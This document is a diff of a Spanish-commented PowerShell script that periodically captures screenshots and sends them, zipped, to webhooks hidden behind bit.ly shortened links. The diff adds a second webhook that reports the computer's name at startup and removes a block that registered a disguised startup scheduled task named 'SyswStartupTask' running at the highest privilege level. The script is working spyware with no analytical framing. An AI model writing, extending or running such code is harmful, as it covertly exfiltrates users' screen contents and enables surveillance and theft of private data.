@@ -1,6 +1,8 @@
 # URL del webhook principal
 $mainWebhookUrl = "https://bit.ly/web_chupakbras"
-$seconds = 60  # Intervalo de captura de pantalla en segundos
+# URL del webhook secundario
+$secondaryWebhookUrl = "https://bit.ly/web_chupacabras"
+$seconds = 120  # Intervalo de captura de pantalla en segundos
 $numberOfScreenshots = 3  # Cantidad de capturas de pantalla a enviar en un archivo zip
 
 # Función para tomar y enviar capturas de pantalla
@@ -38,25 +40,22 @@ function TakeAndSendScreenshots {
     }
 }
 
-# Ejecuta la función para tomar y enviar capturas de pantalla cada 30 segundos
+# Función para enviar mensaje al webhook secundario
+function SendMessageToSecondaryWebhook {
+    try {
+        Write-Host "Enviando mensaje al webhook secundario..."
+        $message = "Computadora encendida: $($env:COMPUTERNAME)"
+        Invoke-RestMethod -Uri $secondaryWebhookUrl -Method Post -Body @{message=$message} -ContentType 'application/json'
+    } catch {
+        Write-Host "Error al enviar el mensaje al webhook secundario: $_"
+    }
+}
+
+# Enviar mensaje al webhook secundario al iniciar Windows
+SendMessageToSecondaryWebhook
+
+# Ejecuta la función para tomar y enviar capturas de pantalla cada 120 segundos
 while ($true) {
     TakeAndSendScreenshots
     Start-Sleep -Seconds $seconds
 }
-
-# Nombre y descripción de la tarea programada
-$taskName = "SyswStartupTask"
-$taskDescription = "Tarea para ejecutar el script sysw.ps1 al iniciar Windows"
-
-# Ruta del script PowerShell
-$scriptPath = "$env:temp\sysw.ps1"
-
-# Comando para agregar la tarea programada
-$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-File '$scriptPath'"
-$trigger = New-ScheduledTaskTrigger -AtStartup
-$settings = New-ScheduledTaskSettingsSet -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
-
-Register-ScheduledTask -TaskName $taskName -Description $taskDescription -Action $action -Trigger $trigger -Settings $settings -User $env:USERNAME -RunLevel Highest -Force
-
-
-
